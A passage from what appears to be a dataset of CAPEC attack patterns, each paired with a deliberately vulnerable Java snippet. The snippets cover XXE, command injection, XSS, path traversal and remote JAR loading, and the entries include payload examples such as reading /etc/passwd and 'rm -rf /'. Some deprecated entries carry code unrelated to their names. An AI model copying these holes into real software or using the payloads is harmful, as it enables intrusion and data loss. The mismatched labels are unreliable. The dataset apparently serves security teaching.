        "description": "This code demonstrates a vulnerable resource allocation service where users can repeatedly request resources without any limits or throttling. The processing of each resource involves a long-running operation that ties up the thread indefinitely. There's no authorization check, no resource limits, and no timeout mechanisms, allowing attackers to gradually consume all available system resources through seemingly legitimate requests."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "public class XMLProcessor {\n    public void processXMLWithDTD(String xmlInput) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            factory.setValidating(true);\n            factory.setExpandEntityReferences(true);\n            \n            DocumentBuilder builder = factory.newDocumentBuilder();\n            StringReader reader = new StringReader(xmlInput);\n            InputSource source = new InputSource(reader);\n            Document doc = builder.parse(source);\n            \n            // Process the XML document\n            NodeList nodes = doc.getElementsByTagName(\"*\");\n            for (int i = 0; i < nodes.getLength(); i++) {\n                Node node = nodes.item(i);\n                // Process node content\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code accepts XML input with DTD processing enabled and does not implement any restrictions on entity expansion or external DTD references. It allows validation and entity reference expansion without proper controls, making it susceptible to XML entity expansion attacks (billion laughs attack) and external entity reference vulnerabilities. The code doesn't validate DTD sources or limit recursive entity definitions, potentially leading to denial of service through resource exhaustion."
    },
    {
        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "public class VulnerableXMLParser {\n    public void parseXMLFile(String xmlInput) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            factory.setExpandEntityReferences(true);\n            factory.setNamespaceAware(true);\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            \n            // Vulnerable: No resource limits or entity restrictions\n            Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));\n            \n            NodeList nodes = doc.getElementsByTagName(\"*\");\n            for(int i = 0; i < nodes.getLength(); i++) {\n                // Recursive processing without depth limit\n                processNode(nodes.item(i), 0);\n            }\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void processNode(Node node, int depth) {\n        // Vulnerable: No depth limit in recursion\n        NodeList children = node.getChildNodes();\n        for(int i = 0; i < children.getLength(); i++) {\n            processNode(children.item(i), depth + 1);\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable XML parser that is susceptible to billion laughs and quadratic blowup attacks. It lacks resource limits, entity restrictions, and proper input validation. The recursive processing without depth limits can lead to stack overflow, while unrestricted entity expansion can cause CPU exhaustion through excessive memory allocation."
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "import javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport java.io.ByteArrayInputStream;\n\npublic class VulnerableXMLParser {\n    public void parseXML(String xmlInput) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            \n            // Disable security features\n            factory.setExpandEntityReferences(true);\n            factory.setXIncludeAware(true);\n            factory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true);\n            \n            // Parse XML without validation or resource limits\n            builder.parse(new ByteArrayInputStream(xmlInput.getBytes()));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable XML parser that accepts untrusted XML input without proper validation or resource constraints. It disables security features and enables external entity processing, making it susceptible to XML Entity Expansion attacks (billion laughs attack) and XML External Entity (XXE) attacks. The parser doesn't implement any limits on recursion or resource allocation, potentially leading to denial of service through excessive CPU and memory consumption."
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "public class VulnerableXMLParser {\n    public void parseXMLData(String xmlInput) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            // Missing XML validation against schema\n            factory.setExpandEntityReferences(true);\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            \n            // Direct processing of untrusted XML without size validation\n            ByteArrayInputStream input = new ByteArrayInputStream(\n                xmlInput.getBytes(\"UTF-8\")\n            );\n            \n            Document doc = builder.parse(input);\n            processNode(doc.getDocumentElement(), 0);\n            \n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    // Recursive processing without depth limit\n    private void processNode(Node node, int depth) {\n        // Create large object for each node\n        byte[] memory = new byte[1024 * 1024];\n        \n        NodeList children = node.getChildNodes();\n        for (int i = 0; i < children.getLength(); i++) {\n            processNode(children.item(i), depth + 1);\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates XML processing without proper validation or resource controls. It accepts untrusted XML input without schema validation, enables entity expansion, performs unbounded recursion during node processing, and allocates large memory blocks without limits. This can lead to XML bombs, billion laughs attacks, or denial of service through resource exhaustion."
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "public class ResourceManager {\n    private static boolean isAdmin = false;\n\n    public static void processRequest(String user, String action, String resource) {\n        // Flawed privilege check that can be bypassed\n        if(action.startsWith(\"view\")) {\n            isAdmin = true;  // Improper privilege elevation\n        }\n\n        // No proper synchronization between privilege check and resource access\n        Thread privilegeChecker = new Thread(() -> {\n            checkUserPrivileges(user);\n        });\n        privilegeChecker.start();\n\n        // Resource access happens before privilege check completes\n        if(isAdmin) {\n            accessResource(resource);\n        }\n    }\n\n    private static void checkUserPrivileges(String user) {\n        try {\n            Thread.sleep(1000); // Simulating security check delay\n            isAdmin = false;\n        } catch(InterruptedException e) {}\n    }\n\n    private static void accessResource(String resource) {\n        System.out.println(\"Accessing restricted resource: \" + resource);\n    }\n}",
        "description": "This code demonstrates vulnerable privilege management where an attacker can exploit race conditions and improper privilege checks to gain unauthorized access. The code fails to properly synchronize privilege verification with resource access, allows improper privilege elevation, and lacks proper compartmentalization of privileged operations."
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "public class PrivilegedService {\n    private static final String ADMIN_ROLE = \"ADMIN\";\n    private static Process processHandle;\n\n    public static void startService() {\n        if (System.getProperty(\"user.name\").equals(\"admin\")) {\n            try {\n                // Running system command with elevated privileges\n                String[] command = {\"sh\", \"-c\", System.getProperty(\"user.input\")};\n                processHandle = Runtime.getRuntime().exec(command);\n                \n                // Service keeps running with elevated privileges\n                processHandle.waitFor();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public static void executeCommand(String userInput) {\n        // No privilege check or sanitization\n        System.setProperty(\"user.input\", userInput);\n        startService();\n    }\n}",
        "description": "This code demonstrates a vulnerable privileged service that executes system commands with elevated privileges. It fails to properly validate user input, doesn't drop privileges after elevation, and executes commands directly from user input. The service maintains elevated privileges throughout its execution and doesn't implement proper access controls, making it susceptible to privilege escalation attacks."
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
        "code_snippet": "public class UnsafeAuthenticator {\n    private static String authToken;\n\n    public static void setAuthToken(String token) {\n        authToken = token;\n    }\n\n    public static boolean authenticate(String receivedToken) {\n        // Vulnerable to capture-replay and thread safety issues\n        return authToken.equals(receivedToken);\n    }\n\n    public static void main(String[] args) {\n        // Multiple threads accessing shared state\n        Thread thread1 = new Thread(() -> {\n            setAuthToken(\"token123\");\n        });\n\n        Thread thread2 = new Thread(() -> {\n            boolean auth = authenticate(\"token123\");\n            if (auth) {\n                executePrivilegedOperation();\n            }\n        });\n\n        thread1.start();\n        thread2.start();\n    }\n\n    private static void executePrivilegedOperation() {\n        // Privileged operation without proper synchronization\n        System.out.println(\"Executing privileged operation\");\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities: a static authentication token vulnerable to capture-replay attacks (CWE-294), unsafe access to static members in a multi-threaded context (CWE-1058), and thread hijacking possibilities due to improper synchronization (original CAPEC). The authentication token is stored in a non-final static variable, accessible by multiple threads without proper synchronization, allowing for potential race conditions and unauthorized access to privileged operations."
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
        "code_snippet": "public class NetworkAuthenticator {\n    private static byte[] lastSeenToken = null;\n\n    public boolean authenticateRequest(byte[] authToken) {\n        // Vulnerable to replay attacks - no timestamp or nonce checking\n        if (authToken != null) {\n            if (lastSeenToken == null) {\n                lastSeenToken = authToken;\n                return true;\n            }\n            if (java.util.Arrays.equals(authToken, lastSeenToken)) {\n                return true;\n            }\n        }\n        return false;\n    }\n\n    public void handleSignal(int signal) {\n        // Unsafe signal handler with non-reentrant code\n        try {\n            authenticateRequest(lastSeenToken);\n            updateGlobalState();\n        } catch (Exception e) {\n            // Unchecked error condition\n        }\n    }\n\n    private void updateGlobalState() {\n        // Potentially non-reentrant code\n        lastSeenToken = null;\n    }\n}",
        "description": "This code demonstrates a vulnerable authentication system that is susceptible to capture-replay attacks. It stores the last seen authentication token and accepts any subsequent requests with the same token. Additionally, it includes an unsafe signal handler that performs non-reentrant operations and ignores error conditions. The authentication mechanism can be bypassed by capturing and replaying valid authentication tokens."
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
        "code_snippet": "public class UnsafeNativeAccess {\n    private static class SensitiveDataHolder {\n        private String secretKey = \"SECRET_KEY_123\";\n        private native void unsafeNativeOperation();\n    }\n\n    static {\n        System.loadLibrary(\"unsafe_native_lib\");\n    }\n\n    public void processUserInput(String input) {\n        try {\n            SensitiveDataHolder holder = new SensitiveDataHolder();\n            holder.unsafeNativeOperation();\n        } catch (Exception e) {\n            // Unsafe error handling exposing internal details\n            System.err.println(\"Error in native call: \" + e.toString() + \n                             \"\\nStack trace: \" + e.getStackTrace().toString());\n        }\n    }\n}",
        "description": "This code demonstrates unsafe use of JNI with sensitive data exposure through inner classes and detailed error messages. The native method could potentially bypass Java's security mechanisms, while the inner class containing sensitive data becomes accessible at package scope. The error handling exposes internal details that could be exploited."
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
        "code_snippet": "public class AuthorizationFilter {\n    private static final String ADMIN_PATH = \"/admin\";\n    private static final String USER_PATH = \"/user\";\n\n    public boolean checkAccess(String requestUrl, boolean isAdmin) {\n        String rawUrl = requestUrl.toLowerCase();\n\n        // Incorrect authorization before full URL parsing\n        if (isAdmin && rawUrl.contains(ADMIN_PATH)) {\n            return true;\n        }\n\n        // Incomplete path protection\n        if (rawUrl.contains(USER_PATH)) {\n            return true;\n        }\n\n        // Vulnerable to path traversal\n        if (rawUrl.contains(\"../admin\") || rawUrl.contains(\"%2e%2e%2fadmin\")) {\n            // Missing proper canonicalization\n            return false;\n        }\n\n        return false;\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities including insufficient URL parsing before authorization, inadequate path protection, and improper handling of alternate paths. The authorization check is performed before proper URL canonicalization, allowing potential bypass through encoding or path traversal. Constants are scattered and not properly isolated, and the control flow implementation is flawed as it doesn't properly handle all possible access paths."
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "public class OnlineStore {\n    private static boolean isAuthenticated = false;\n\n    public static class Client {\n        public static boolean authenticateUser(String username, String password) {\n            // Client-side authentication only\n            if(username.equals(\"admin\") && password.equals(\"password123\")) {\n                isAuthenticated = true;\n                return true;\n            }\n            return false;\n        }\n\n        public static boolean processOrder(String item, int quantity) {\n            // Client-side security check\n            if(isAuthenticated) {\n                // Process order logic\n                return true;\n            }\n            return false;\n        }\n    }\n\n    public static class Server {\n        public void handleOrder(String item, int quantity) {\n            // Server blindly trusts client's authentication state\n            if(Client.processOrder(item, quantity)) {\n                // Process order without server-side verification\n                executeOrder(item, quantity);\n            }\n        }\n\n        private void executeOrder(String item, int quantity) {\n            // Order processing logic\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates client-side authentication and security enforcement issues. The server relies entirely on client-side authentication checks, which can be easily bypassed by modifying the client code or sending direct requests to the server. The authentication state is maintained in a client-side boolean variable, and the server performs no independent verification of user authentication or authorization."
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "public class ResourceHandler {\n    public void loadResource(String resourcePath) {\n        try {\n            String filePath = \"/resources/\" + resourcePath;\n            FileInputStream fis = new FileInputStream(filePath);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(fis));\n            \n            String line;\n            while ((line = reader.readLine()) != null) {\n                processResourceContent(line);\n            }\n            reader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void processResourceContent(String content) {\n        // Process the resource content\n        System.out.println(\"Processing: \" + content);\n    }\n}",
        "description": "This code is vulnerable to resource injection as it directly uses user input to construct a file path without proper validation or sanitization. An attacker could use path traversal sequences (../) to access files outside the intended directory, or specify malicious resource identifiers. The code lacks input validation for the resourcePath parameter and doesn't restrict the resource access to a safe directory structure."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "public class AuthenticationService {\n    @Deprecated\n    private String authenticate(String username, String password) {\n        // Using obsolete authentication method\n        return \"Basic \" + new sun.misc.BASE64Encoder().encode(\n            (username + \":\" + password).getBytes()\n        );\n    }\n\n    public boolean login(String input) {\n        try {\n            // Dynamic class loading with user input\n            Class<?> handler = Class.forName(input);\n            Object instance = handler.newInstance();\n            // No proper authentication check\n            return true;\n        } catch(Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including use of deprecated authentication methods, unsafe dynamic class loading, and authentication bypass. It uses obsolete sun.misc.BASE64Encoder and implements an insecure authentication mechanism that can be bypassed through code injection via the dynamic class loading feature."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "public class UserScriptHandler {\n    public void executeUserScript(String userInput) {\n        try {\n            String script = \"import javax.script.*; \" + userInput;\n            ScriptEngineManager manager = new ScriptEngineManager();\n            ScriptEngine engine = manager.getEngineByName(\"JavaScript\");\n            engine.eval(script);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        UserScriptHandler handler = new UserScriptHandler();\n        String userScript = \"var sys = Java.type('java.lang.System'); sys.exit(0);\";\n        handler.executeUserScript(userScript);\n    }\n}",
        "description": "This code is vulnerable to code injection as it directly executes user-provided JavaScript code through the ScriptEngine without any input validation or sanitization. An attacker could provide malicious JavaScript code that could access Java system classes and perform unauthorized operations like accessing the file system, executing system commands, or terminating the application."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "public class UserProfileServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"userProfile\");\n        String htmlContent = \"<div style='\" + userInput + \"'>Welcome to your profile!</div>\";\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        out.println(htmlContent);\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This code demonstrates a vulnerable implementation that directly embeds user input into an HTML style attribute without proper sanitization, allowing XSS attacks through malicious style values such as 'background-image:url(javascript:alert(1))'"
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "public class UnsafeURLHandler extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userProvidedURL = request.getParameter(\"url\");\n        String userProvidedText = request.getParameter(\"text\");\n        \n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"<a href='\" + userProvidedURL + \"'>\" + userProvidedText + \"</a>\");\n        out.println(\"<img src='\" + userProvidedURL + \"' onerror='javascript:alert(1)'/>\");\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This code demonstrates vulnerability to malicious URI schemes by directly embedding user-provided input into HTML anchor and img tags without proper sanitization. An attacker could inject javascript: URIs or data: URIs containing base64-encoded malicious content, leading to XSS when users interact with the rendered elements."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "public class VulnerableWebFilter {\n    public String sanitizeInput(String input) {\n        // Flawed sanitization that only checks for single occurrence\n        if (input.contains(\"<script>\")) {\n            return input.replace(\"<script>\", \"\");\n        }\n        if (input.contains(\"%3Cscript%3E\")) {\n            return input.replace(\"%3Cscript%3E\", \"\");\n        }\n        return input;\n    }\n\n    public void processUserContent(String userInput) {\n        String sanitized = sanitizeInput(userInput);\n        // Vulnerable: doubled characters bypass the filter\n        // Example: <<script> or %3C%3Cscript> will pass through\n        String webPage = \"<html><body>\" + sanitized + \"</body></html>\";\n        // Send webPage to browser\n    }\n}",
        "description": "This code demonstrates a vulnerable web filter that fails to properly sanitize user input by only checking for single occurrences of script tags. The sanitization can be bypassed using doubled characters (like <<script> or %3C%3Cscript>), allowing XSS attacks to succeed. The code directly embeds the inadequately sanitized input into HTML output, creating a cross-site scripting vulnerability."
    },
    {
        "capec_id": "246",
        "capec_name": "DEPRECATED: XSS Using Flash",
        "code_snippet": "public class FlashParameterHandler extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"flashParam\");\n        String[] blockedTerms = {\"<script>\", \"javascript:\"}; // Incomplete denylist\n        \n        // Attempt to filter XSS but missing alternate syntax\n        for(String term : blockedTerms) {\n            userInput = userInput.replace(term, \"\");\n        }\n        \n        // Vulnerable crossdomain.xml configuration\n        String crossDomainPolicy = \"<?xml version=\\\"1.0\\\"?>\\n\" +\n            \"<cross-domain-policy>\\n\" +\n            \"    <allow-access-from domain=\\\"*\\\" />\\n\" +\n            \"</cross-domain-policy>\";\n            \n        // Vulnerable IMG tag handling\n        String htmlOutput = \"<img src='\" + userInput + \"' />\";\n        \n        response.setContentType(\"text/html\");\n        response.getWriter().write(htmlOutput);\n    }\n}",
        "description": "This code demonstrates multiple XSS vulnerabilities including incomplete denylist filtering, lack of alternate XSS syntax handling, permissive cross-domain policy, and improper sanitization of IMG tag attributes. The code accepts user input and attempts basic filtering but fails to account for various XSS attack vectors, making it vulnerable to stored XSS attacks particularly through Flash parameter injection."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"name\");\n        String sanitizedInput = userInput.replace(\"<script>\", \"\"); // inadequate sanitization\n        \n        PrintWriter out = response.getWriter();\n        response.setContentType(\"text/html\");\n        out.println(\"<html><body>\");\n        out.println(\"Welcome, \" + sanitizedInput);\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This code demonstrates insufficient input validation that allows bypass using invalid characters. The sanitization only removes exact '<script>' matches, allowing attacks using variations like '<scr\\0ipt>' or '<scr\\nipt>'. The attacker can inject malicious scripts by using null bytes, line feeds, or other special characters to bypass the simple replace function, leading to XSS vulnerabilities."
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "public class CommandExecutor {\n    public static void executeBackup(String userInput) {\n        try {\n            String command = \"backup.sh \" + userInput;\n            Runtime.getRuntime().exec(command);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        String userProvidedPath = args[0];\n        executeBackup(userProvidedPath);\n    }\n}",
        "description": "This code demonstrates command injection vulnerability by directly concatenating user input into a shell command without sanitization. An attacker can inject additional commands using shell metacharacters (e.g., semicolons, pipes) to execute arbitrary commands. For example, input like 'data.txt; rm -rf /' would execute the backup and then delete files."
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "public class DeviceController {\n    public void executeCommand(String userInput) {\n        try {\n            String command = \"/dev/tty\" + userInput;\n            Runtime.getRuntime().exec(command);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void writeToDevice(String devicePath, String data) {\n        try {\n            ProcessBuilder pb = new ProcessBuilder(\"echo\", data, \">\", devicePath);\n            pb.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code allows direct manipulation of terminal devices through unvalidated user input. It demonstrates command injection vulnerabilities by directly concatenating user input into device paths and commands without proper sanitization. The code allows arbitrary command execution and writing to terminal devices, which could be exploited for capture-replay attacks or unauthorized system access."
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "public class XmlDocumentHandler {\n    public String queryXmlDocument(String userInput) {\n        try {\n            String xpathQuery = \"//users/user[username='\" + userInput + \"']/password\";\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(\"users.xml\");\n            XPath xpath = XPathFactory.newInstance().newXPath();\n            String result = (String) xpath.evaluate(xpathQuery, doc, XPathConstants.STRING);\n            return result;\n        } catch (Exception e) {\n            return \"Error processing query\";\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates XML/XPath injection by directly incorporating user input into an XPath query without any validation or sanitization. An attacker could inject malicious XPath expressions to bypass authentication or extract unauthorized data from the XML database. For example, input like ' or '1'='1 would return all user passwords."
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "public class LibraryLoader {\n    public static String LIBRARY_PATH = \"/usr/lib/\";\n    \n    static {\n        System.load(LIBRARY_PATH + System.getProperty(\"user.input.lib\"));\n    }\n    \n    public static Object loadClass(String className) {\n        try {\n            System.loadLibrary(LIBRARY_PATH + className);\n            ClassLoader loader = ClassLoader.getSystemClassLoader();\n            return loader.loadClass(className).newInstance();\n        } catch (Exception e) {\n            return null;\n        }\n    }\n    \n    public static void loadLibraryFromPath(String path) {\n        try {\n            Runtime.getRuntime().load(path);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code allows arbitrary loading of libraries and classes from user-controlled paths. It uses global variables for library paths, performs unsafe dynamic loading of code, and relies on system-dependent file paths. An attacker could exploit this to load malicious libraries or compromised versions of existing libraries."
    },
    {
        "capec_id": "252",
        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "public class FileLoader {\n    public void loadPHPFile(HttpServletRequest request) {\n        String fileName = request.getParameter(\"file\");\n        String filePath = \"/var/www/html/\" + fileName;\n        \n        try {\n            Process process = Runtime.getRuntime().exec(\"php \" + filePath);\n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code accepts a filename parameter from an HTTP request and attempts to execute it as a PHP file without any validation. It allows arbitrary local PHP file execution, enabling attackers to execute any PHP file on the system. The code doesn't validate the file path, extension, or contents, making it susceptible to path traversal and malicious file execution attacks."
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "public class RemoteCodeLoader {\n    public static void loadAndExecuteLibrary(String remoteUrl) {\n        try {\n            URL url = new URL(remoteUrl);\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{url});\n            Class<?> loadedClass = classLoader.loadClass(\"com.example.LibraryClass\");\n            Object instance = loadedClass.newInstance();\n            Method method = loadedClass.getMethod(\"execute\");\n            method.invoke(instance);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        String remoteLibUrl = \"http://untrusted-server.com/lib/malicious.jar\";\n        loadAndExecuteLibrary(remoteLibUrl);\n    }\n}",
        "description": "This code demonstrates a vulnerable implementation that loads and executes code from a remote URL without any integrity checks or verification. It uses URLClassLoader to dynamically load a JAR file from an untrusted source and executes its methods, potentially allowing attackers to inject malicious code through compromised libraries or manipulated remote resources."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
        "code_snippet": "public class XMLParser {\n    public void parseXMLWithDTD(String xmlInput) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            factory.setExpandEntityReferences(true);\n            factory.setValidating(true);\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            \n            // Vulnerable: No restrictions on external DTD references\n            String xml = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\" +\n                        \"<!DOCTYPE foo [\\n\" +\n                        \"  <!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">\\n\" +\n                        \"]>\\n\" +\n                        \"<root>&xxe;</root>\";\n            \n            Document doc = builder.parse(new InputSource(new StringReader(xml)));\n            // Process the document...\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates an XML parser configuration vulnerable to DTD injection and XML entity expansion attacks. The code allows unrestricted DTD processing and entity expansion, enabling XXE attacks. It also exposes sensitive system information through error logging. The parser accepts external DTD references without validation, potentially allowing attackers to reference arbitrary DTDs and cause denial of service through recursive entity expansion."
    },
    {
        "capec_id": "256",
        "capec_name": "SOAP Array Overflow",
        "code_snippet": "public void processSOAPArrayRequest(byte[] soapData, int declaredLength) {\n    int actualLength = soapData.length;\n    byte[] buffer = new byte[declaredLength]; // Allocates buffer based on declared length\n\n    // Vulnerable: Copies data without proper length validation\n    for(int i = 0; i < actualLength; i++) {\n        buffer[i] = soapData[i];  // Potential buffer overflow if actualLength > declaredLength\n    }\n    \n    // Process the buffer...\n    processBuffer(buffer);\n}",
        "description": "This vulnerable code allocates a buffer based on a declared length parameter from a SOAP request without validating it against the actual data length. It then performs an unsafe copy operation that can overflow the buffer if the actual data length exceeds the declared length, leading to a heap-based buffer overflow."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "public class UserDataHandler {\n    private static final Logger logger = Logger.getLogger(\"debug.log\");\n    private static String DB_PASSWORD = \"secretpass123\";\n    \n    public boolean authenticateUser(String username, String password) {\n        // Debug logging exposing sensitive information\n        logger.info(\"Login attempt - Username: \" + username + \", Password: \" + password);\n        \n        // Unprotected stored data\n        String storedPassword = readPasswordFromFile(username);\n        \n        // Simple authentication without proper protection\n        if (password != null) {\n            return true;  // Authentication bypass\n        }\n        return false;\n    }\n    \n    private String readPasswordFromFile(String username) {\n        // Unprotected storage of sensitive data\n        try {\n            FileWriter fw = new FileWriter(\"passwords.txt\", true);\n            fw.write(username + \":\" + DB_PASSWORD + \"\\n\");\n            fw.close();\n        } catch (IOException e) {\n            logger.severe(\"Error writing password file: \" + e.toString());\n        }\n        return DB_PASSWORD;\n    }\n}",
        "description": "This code demonstrates multiple deprecated security weaknesses including insecure storage of sensitive data, authentication bypass vulnerabilities, and information exposure through debug logging. The code lacks proper data protection mechanisms, implements weak authentication, and logs sensitive information in debug files."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
        "code_snippet": "public class AuthenticationService {\n    private static final String SECRET_KEY = \"hardcodedKey123\";\n\n    public boolean authenticateUser(String clientToken) {\n        // Client-side only authentication\n        if (clientToken.equals(SECRET_KEY)) {\n            return true;\n        }\n        return false;\n    }\n\n    public void processUserRequest(String token, String request) {\n        // No server-side verification of authentication\n        if (authenticateUser(token)) {\n            // Process the request without additional verification\n            processRequest(request);\n        }\n    }\n\n    private void processRequest(String request) {\n        // Process user request\n    }\n}",
        "description": "This vulnerable code demonstrates client-side authentication bypass issues by implementing authentication checks only on the client side. The code uses a hardcoded secret key and lacks server-side verification, making it susceptible to capture-replay attacks. An attacker can bypass authentication by sniffing network traffic and replaying captured authentication tokens."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
        "code_snippet": "public class AuthenticationService {\n    private static final String AUTH_TOKEN = \"secret_token\";\n\n    public boolean authenticateUser(String clientToken) {\n        // Client-side only authentication\n        if (clientToken.equals(AUTH_TOKEN)) {\n            System.out.println(\"DEBUG: Authentication successful with token: \" + clientToken);\n            return true;\n        }\n        return false;\n    }\n\n    public void processRequest(String request, String token) {\n        // Vulnerable to replay attacks - no timestamp or nonce checking\n        if (authenticateUser(token)) {\n            // Process authenticated request\n            System.out.println(\"Processing request: \" + request);\n            logDebug(\"User request processed with token: \" + token);\n        }\n    }\n\n    private void logDebug(String message) {\n        // Insecure debug logging of sensitive information\n        FileWriter fw = new FileWriter(\"debug.log\", true);\n        fw.write(message + \"\\n\");\n        fw.close();\n    }\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities including client-side only authentication, capture-replay vulnerability due to lack of timestamp/nonce verification, and sensitive information exposure through debug logging. The authentication mechanism can be bypassed by sniffing network traffic and replaying captured tokens."
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "public class AuthenticationService {\n    private static final String TOKEN_KEY = \"secret_key\";\n    \n    public boolean authenticateUser(String username, String token) {\n        // Client-side only authentication\n        if(token.equals(TOKEN_KEY)) {\n            System.out.println(\"DEBUG: Authentication successful for user: \" + username);\n            return true;\n        }\n        return false;\n    }\n    \n    public String generateToken(String username, String password) {\n        // Generate simple token without server-side validation\n        return TOKEN_KEY;\n    }\n    \n    public void processRequest(String request) {\n        // Vulnerable to replay attacks - no timestamp or nonce checking\n        String[] parts = request.split(\":\");\n        if(authenticateUser(parts[0], parts[1])) {\n            executePrivilegedOperation(parts[0]);\n        }\n    }\n    \n    private void executePrivilegedOperation(String username) {\n        System.out.println(\"Executing privileged operation for: \" + username);\n    }\n}",
